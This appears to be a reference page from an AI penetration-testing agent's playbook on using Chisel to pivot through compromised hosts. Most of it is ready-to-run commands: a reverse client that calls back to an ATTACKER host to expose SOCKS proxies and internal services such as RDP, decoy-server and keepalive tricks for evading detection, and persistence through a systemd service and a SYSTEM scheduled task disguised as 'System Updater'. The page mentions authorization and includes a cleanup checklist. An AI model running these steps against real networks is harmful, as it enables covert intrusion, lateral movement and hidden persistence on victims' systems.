### Ref: Chisel

**Root pattern:** Chisel is a Go-based TCP/UDP tunnel transported over HTTP and secured (optionally) via SSH-style key auth or TLS. One binary acts as either server or client; the typical pivot deployment runs the **server on the attacker** and a **reverse client on the pivot** that calls back over 80/443 — this means no inbound port needs to be opened on the pivot (only outbound HTTP egress) and the SOCKS5 proxy ends up listening on the attacker side. Use chisel when egress from the pivot is restricted to web protocols, when sshd is unavailable, or when you need a SOCKS proxy without the auth.log footprint of an `ssh -D` session.

**When to use:**
- Pivot has HTTP/HTTPS outbound but TCP/22 is blocked
- You don't have valid sshd creds on the pivot (so `ssh -D` is off the table)
- You want a single-binary, single-flag tunnel without configuring sshd, MSF, or TUN interfaces
- You need ARM/MIPS support — chisel publishes pre-built binaries for embedded/ARM targets

**When NOT to use:**
- You need ICMP, full UDP, or any traffic proxychains can't carry → use ligolo-ng instead
- You have a meterpreter session already → use msf `route` + `socks_proxy` (no extra binary to drop)
- The pivot has working sshd + creds → `ssh -D 1080` is simpler

---

**Step 1 — Verify chisel is installed on the attacker:**
```
Bash("which chisel || apt install -y chisel")
```

**Step 2 — Pick the right pivot architecture before transferring:**
```
# On the pivot (via your existing access channel):
uname -m            # x86_64 → amd64, aarch64 → arm64, armv7l → armv7, mips → mips, …

# Releases live at https://github.com/jpillora/chisel/releases
# Download the matching binary on the attacker, then serve via the Phase 11 cradle.
```

---

**Mode 1 — Reverse SOCKS5 proxy (the most common pivot pattern):**
```
# Attacker — server in tmux:
Bash("tmux new-session -d -s chisel 'chisel server -p 8080 --reverse --socks5 --auth user:s3cret'")

# Pivot — client connects back, exposes SOCKS5 on attacker:1080:
/tmp/chisel client http://ATTACKER:8080 R:1080:socks --auth user:s3cret &

# Attacker — verify:
Bash("ss -tlnp | grep 1080")   # SOCKS5 listener now on attacker
```

After the tunnel is up, configure proxychains4 (see `refs/proxychains.md`) and run any TCP tool through `127.0.0.1:1080`.

**Mode 2 — Reverse single-port forward** (less noisy than full SOCKS — only one internal service):
```
# Pivot:
/tmp/chisel client http://ATTACKER:8080 R:8443:internal-app.local:443 --auth user:s3cret &

# Attacker reaches the internal HTTPS service at 127.0.0.1:8443 directly — no proxychains needed:
Bash("curl -k https://127.0.0.1:8443/")
```

**Mode 3 — Forward (non-reverse) port** — pivot is the chisel server, attacker is the client (rare; requires inbound port on pivot):
```
# Pivot:
/tmp/chisel server -p 8080 --socks5 --auth user:s3cret &

# Attacker:
Bash("chisel client http://PIVOT:8080 1080:socks --auth user:s3cret &")
Bash("ss -tlnp | grep 1080")
```

**Mode 4 — Multiple tunnels in one connection** — chain remote port-forwards in a single chisel client invocation:
```
/tmp/chisel client http://ATTACKER:8080 \
    R:1080:socks \
    R:8443:internal-app.local:443 \
    R:13389:rdp-host.local:3389 \
    --auth user:s3cret &
```

---

**TLS hardening** (recommended any time you're not in a lab):
```
# Attacker — generate cert and serve over TLS (chisel handles wss:// natively):
Bash("openssl req -x509 -newkey rsa:2048 -keyout /tmp/chisel.key -out /tmp/chisel.crt -days 30 -nodes -subj '/CN=cdn.example.com'")
Bash("tmux new-session -d -s chisel 'chisel server -p 443 --reverse --socks5 --auth user:s3cret --tls-cert /tmp/chisel.crt --tls-key /tmp/chisel.key'")

# Pivot connects to https:// instead of http://:
/tmp/chisel client https://ATTACKER:443 R:1080:socks --auth user:s3cret --tls-skip-verify &
```

For real opsec, terminate TLS on a domain you own with a real cert — `--tls-cert` / `--tls-key` accept any standard PEM.

**Built-in HTTP backend** — chisel server can also serve static content at `/`, useful as a combined payload-delivery + tunnel endpoint that looks like a normal web server to anyone probing it:
```
chisel server -p 8080 --reverse --socks5 --backend http://localhost:8000 --auth user:s3cret
python3 -m http.server 8000
```

---

**Persistence on the pivot** (only when authorized — leaves disk artifacts):

Linux systemd unit (`/etc/systemd/system/system-updater.service`):
```
[Unit]
Description=System Updater
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/chisel client https://ATTACKER:443 R:1080:socks --auth user:s3cret --tls-skip-verify
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```
```
systemctl enable --now system-updater
```

Windows scheduled task (run as SYSTEM):
```
schtasks /create /tn "SystemUpdater" /tr "C:\Windows\Temp\chisel.exe client https://ATTACKER:443 R:1080:socks --auth user:s3cret" /sc onstart /ru SYSTEM /f
```

---

**Common flags reference:**

| Flag | Side | Purpose |
|------|------|---------|
| `-p PORT` | server | Port to listen on |
| `--reverse` | server | Allow clients to request reverse port forwards (`R:…`) |
| `--socks5` | server | Enable the built-in SOCKS5 endpoint (used as the `socks` keyword in tunnel specs) |
| `--auth USER:PASS` | both | Basic-auth gate on the tunnel |
| `--tls-cert FILE` / `--tls-key FILE` | server | Serve over TLS using a real (or self-signed) cert |
| `--tls-skip-verify` | client | Trust any server cert (use for self-signed in lab; remove in prod) |
| `--keepalive DURATION` | both | Periodic ping; default `25s`. Bump to `60s` to look like long-poll |
| `--backend URL` | server | Reverse-proxy non-tunnel HTTP requests to a real backend (decoy) |
| `R:LPORT:RHOST:RPORT` | client | Reverse port forward — listener on server side |
| `R:LPORT:socks` | client | Reverse SOCKS5 — listener on server side |
| `LPORT:RHOST:RPORT` | client | Local forward — listener on client side (forward mode) |
| `LPORT:socks` | client | Local SOCKS5 — listener on client side (forward mode) |

---

**Cleanup checklist:**
```
# Attacker:
Bash("tmux kill-session -t chisel 2>/dev/null")

# Pivot (via access channel):
pkill -f /tmp/chisel
rm -f /tmp/chisel
# If persistence was installed:
systemctl disable --now system-updater && rm -f /etc/systemd/system/system-updater.service
```

Append a `note` event for each cleanup step with the result.
